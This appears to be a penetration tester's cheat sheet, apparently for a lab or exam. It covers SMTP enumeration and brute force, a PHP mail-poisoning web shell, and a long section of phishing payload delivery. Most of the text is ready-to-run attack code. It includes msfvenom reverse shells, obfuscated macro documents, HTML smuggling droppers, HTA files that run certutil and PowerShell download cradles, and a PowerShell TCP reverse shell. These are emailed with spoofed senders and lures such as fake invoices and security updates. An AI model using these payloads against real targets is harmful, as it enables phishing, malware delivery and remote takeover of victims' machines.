## Ports

|Port|Description|
|---|---|
|25|SMTP (plain)|
|465|SMTPS (SSL)|
|587|SMTP Submission (TLS)|
## Initial Setup

```bash
export ip=192.168.237.171
```
## Enumeration

### Nmap Scripts

```bash
nmap -Pn -sV --script=smtp-commands,smtp-enum-users,smtp-ntlm-info,smtp-open-relay,smtp-vuln* -p 25,465,587 $ip
```
### User Enumeration

**smtp-user-enum (preferred):**
```bash
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $ip
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t $ip
smtp-user-enum -M VRFY -D $domain -u root -t $ip
```
**Manual:**

```bash
echo "VRFY admin" | nc -nv -w 1 $ip 25
```
**Metasploit:**
```bash
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS $ip
run
```
## Brute Force

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt smtp://$ip
```
## Connect & Interact

```bash
telnet $ip 25
nc -nv $ip 25
```
**Commands:**

```
EHLO attacker.com
VRFY root
EXPN admin
MAIL FROM:<attacker@evil.com>
RCPT TO:<victim@target.com>
DATA
Subject: Test
Body here
.
QUIT
```
## Attacks

### Phishing with Swaks

```bash
swaks -t victim@target.com --from attacker@evil.com --attach @malicious.file --server $ip --body @body.txt --header "Subject: Urgent" --suppress-data -ap
```
### LFI via Mail Poisoning

```bash
telnet $ip 25
EHLO attacker.com
MAIL FROM:<attacker@evil.com>
RCPT TO:<validuser@target.com>
DATA
Subject: pwned
<?php system($_GET['cmd']); ?>
.
```
Then trigger: `/var/mail/validuser`
### Shellshock (PostFix)

```bash
python2 shellshock.py $ip useradm@mail.local <LHOST> <LPORT> root@mail.local
```
Ref: https://gist.github.com/YSSVirus/0978adadbb8827b53065575bb8fbcb25
## POP3 (if available - port 110)

```bash
telnet $ip 110
USER username
PASS password
LIST
RETR 1
```



### Magicspoofmail
Magicspoofing it's a python script that checks & test SPF/DMARC DNS records an tries to spoof a domain with a open relay mail system.

```
git clone

python3 -m venv venv source venv/bin/activate pip install -r requirements.txt ./magicspoofmail.py -i
./magicspoofmail.py -i


python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com
```
## References

- https://luemmelsec.github.io/Pentest-Everything-SMTP/
- https://www.ndchost.com/wiki/mail/test-smtp-auth-telnet


## Phishing

# Phishing Lab Setup - Multiple Payload Types [macropack]

Must be done on Windows:

wget https://github.com/sevagas/macro_pack/releases/download/v2.2.0/macro_pack.exe

## Setup Variables

```bash
export LHOST=192.168.45.151
export LPORT=443
export TARGET_EMAIL=will@tricky.com
export SMTP_SERVER=192.168.164.159
```

## 1. Word Document (.docm)

```bash
# Generate payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f vba -o payload.vba

# Obfuscate with macro_pack
macro_pack.exe -f payload.vba -o -G invoice.docm

# Send email
swaks -t $TARGET_EMAIL --from accounting@company.com --attach @invoice.docm --server $SMTP_SERVER --body "Please review the attached invoice." --header "Subject: Invoice #4521"

# Listen
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; run"
```

---

## 2. Excel Document (.xlsm)

```bash
# Dropper method
echo "http://$LHOST/payload.exe" "update.exe" | macro_pack.exe -t DROPPER -o -G report.xlsm

# Or meterpreter direct
echo $LHOST $LPORT | macro_pack.exe -t METERPRETER -o -G report.xlsm

# Send email
swaks -t $TARGET_EMAIL --from hr@company.com --attach @report.xlsm --server $SMTP_SERVER --body "Please review Q4 numbers." --header "Subject: Q4 Financial Report"
```

---

## 3. VBS File (.vbs)

```bash
# Generate
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f vbs -o update.vbs

# Or with macro_pack obfuscation
echo $LHOST $LPORT | macro_pack.exe -t METERPRETER -o -G update.vbs

# Send email
swaks -t $TARGET_EMAIL --from it@company.com --attach @update.vbs --server $SMTP_SERVER --body "Please run the attached update script." --header "Subject: Critical Security Update"
```

---

## 4. HTA File (.hta)

```bash
# Generate
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f hta-psh -o update.hta

# Or with macro_pack
echo "calc.exe" | macro_pack.exe -t CMD -o -G update.hta

# Remote command execution HTA
echo "http://$LHOST:8080/result" "whoami" | macro_pack.exe -t REMOTE_CMD -o -G update.hta

# Send email
swaks -t $TARGET_EMAIL --from support@company.com --attach @update.hta --server $SMTP_SERVER --body "Run this diagnostic tool." --header "Subject: IT Diagnostic Required"
```

---

## 5. LNK Shortcut (.lnk)

```bash
# Generate (runs PowerShell download cradle)
echo '"powershell.exe -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('"'http://$LHOST/shell.ps1'"')\"" "powershell.exe"' | macro_pack.exe -G update.lnk

# Or simple command
echo '"cmd.exe /c calc.exe" "calc.exe"' | macro_pack.exe -G update.lnk

# Send in zip (LNK often blocked raw)
zip update.zip update.lnk
swaks -t $TARGET_EMAIL --from it@company.com --attach @update.zip --server $SMTP_SERVER --body "Extract and run the shortcut." --header "Subject: VPN Update Tool"
```

---

## 6. Windows Script File (.wsf)

```bash
# Generate
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f vbs -o payload.vbs
macro_pack.exe -f payload.vbs -o -G script.wsf

# Send email
swaks -t $TARGET_EMAIL --from admin@company.com --attach @script.wsf --server $SMTP_SERVER --body "Please run this configuration script." --header "Subject: Network Configuration Update"
```

---

## 7. HTML Smuggling (bypass email filters)

```bash
# Create HTML that drops exe on open
cat > smuggle.html << 'EOF'
<html>
<body>
<script>
var base64 = "TVqQAAMAAAA..."; // base64 encoded exe
var blob = new Blob([Uint8Array.from(atob(base64), c => c.charCodeAt(0))], {type: 'application/octet-stream'});
var a = document.createElement('a');
a.href = URL.createObjectURL(blob);
a.download = 'update.exe';
a.click();
</script>
</body>
</html>
EOF

# Send email
swaks -t $TARGET_EMAIL --from support@company.com --attach @smuggle.html --server $SMTP_SERVER --body "Open the attached report." --header "Subject: Quarterly Report"
```

---

## 8. ISO/IMG Container (bypass Mark-of-the-Web)

```bash
# Generate payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o payload.exe

# Create ISO containing payload
mkisofs -o update.iso payload.exe

# Send email
swaks -t $TARGET_EMAIL --from it@company.com --attach @update.iso --server $SMTP_SERVER --body "Mount the disk image and run the update." --header "Subject: Software Update"
```

---

## 9. Library-ms (ClickOnce style)

```bash
# Generate library-ms pointing to WebDAV share
macro_pack.exe -G config.library-ms

# Host payload on WebDAV
wsgidav --host 0.0.0.0 --port 80 --root ./webdav_folder

# Send email
swaks -t $TARGET_EMAIL --from admin@company.com --attach @config.library-ms --server $SMTP_SERVER --body "Open attached to access shared files." --header "Subject: Shared Documents"
```

---

## Universal Listener

```bash
msfconsole -q -x "
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
"
```


HTML Smuggling Quick one Liner:

```
# Generate, encode, create HTML, and send in one go
LHOST=192.168.45.204 && LPORT=443 && \
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o /tmp/p.exe && \
B64=$(base64 -w 0 /tmp/p.exe) && \
echo "<html><body><h1>Loading...</h1><script>var b=\"$B64\";var d=atob(b);var u=new Uint8Array(d.length);for(var i=0;i<d.length;i++)u[i]=d.charCodeAt(i);var l=document.createElement('a');l.href=URL.createObjectURL(new Blob([u]));l.download='Invoice.exe';l.click();</script></body></html>" > invoice.html && \
swaks -t will@tricky.com --from billing@tricky.com --attach @invoice.html --server 192.168.170.159 --body "Please review attached invoice." --header "Subject: Invoice #9201"

msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.45.204; set LPORT 443; run"
```
---

## Quick Reference Table

|Format|Bypass Level|Notes|
|---|---|---|
|.docm/.xlsm|Low|Often blocked, needs macros enabled|
|.vbs|Low|Usually blocked by email filters|
|.hta|Medium|Runs via mshta.exe|
|.lnk (in zip)|Medium|Needs extraction|
|.wsf|Medium|Less commonly blocked|
|.html smuggling|High|Drops file client-side|
|.iso/.img|High|Bypasses MOTW|
|.library-ms|High|Needs WebDAV|



Confirmed working one liners:

```
export LHOST=192.168.45.151
export LPORT=443
export TARGET=will@tricky.com
export SMTP=192.168.164.159
```

Web Server
```
python3 -c "from http.server import HTTPServer,SimpleHTTPRequestHandler
class H(SimpleHTTPRequestHandler):
 def end_headers(self):self.send_header('Cache-Control','no-store');super().end_headers()
HTTPServer(('0.0.0.0',80),H).serve_forever()"
```
## 1. HTA + Certutil (x86)

! host webserver on 80
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -e x86/shikata_ga_nai -i 5 -f exe -o update.exe && echo "<html><head><script language=\"VBScript\">Sub Window_OnLoad:CreateObject(\"WScript.Shell\").Run \"cmd /c certutil -urlcache -split -f http://$LHOST/update.exe %TEMP%\svc.exe && %TEMP%\svc.exe\", 0:window.close:End Sub</script></head><body></body></html>" > shell.hta && swaks -t $TARGET --from it@tricky.com --server $SMTP --body "Fix mail issue by running: mshta http://$LHOST/shell.hta" --header "Subject: Urgent Mail Fix"

msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; run"
```

## 2. HTA + Certutil (x64)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -e x64/xor_dynamic -i 3 -f exe -o update.exe && echo "<html><head><script language=\"VBScript\">Sub Window_OnLoad:CreateObject(\"WScript.Shell\").Run \"cmd /c certutil -urlcache -split -f http://$LHOST/update.exe %TEMP%\svc.exe && %TEMP%\svc.exe\", 0:window.close:End Sub</script></head><body></body></html>" > shell.hta && swaks -t $TARGET --from it@tricky.com --server $SMTP --body "Fix mail issue by running: mshta http://$LHOST/shell.hta" --header "Subject: Urgent Mail Fix"


msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; run"
```




##
## Approach 1: Simple HTA with PowerShell Download Cradle

### STEP 1: On Kali - Create the reverse shell script (run.txt)
```bash
cat > run.txt << 'EOF'
$client = New-Object System.Net.Sockets.TCPClient('192.168.45.151',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
EOF
```
### STEP 2: On Kali - Create the HTA
```bash
cat > runner.hta << 'EOF'
<html>
<head>
<script language="JScript">
var shell = new ActiveXObject("WScript.Shell");
var r = shell.Run("powershell.exe -ep bypass -w hidden (New-Object System.Net.WebClient).DownloadString('http://192.168.45.151/run.txt')| IEX");
</script>
</head>
<body>
<script language="JScript">
self.close();
</script>
</body>
</html>
EOF
```
### STEP 3: On Kali - Start web server (Terminal 1)
```bash
python3 -m http.server 80
```
### STEP 4: On Kali - Start listener (Terminal 2)
```bash
nc -nlvp 443
```
### STEP 5: On Kali - Send email (Terminal 3)
```bash
swaks -t will@tricky.com -f tickets@tricky.com --body "Click here to see the issues: http://192.168.45.151/runner.hta" --server 192.168.178.159 --header "Subject: Issues with the mail system"
```

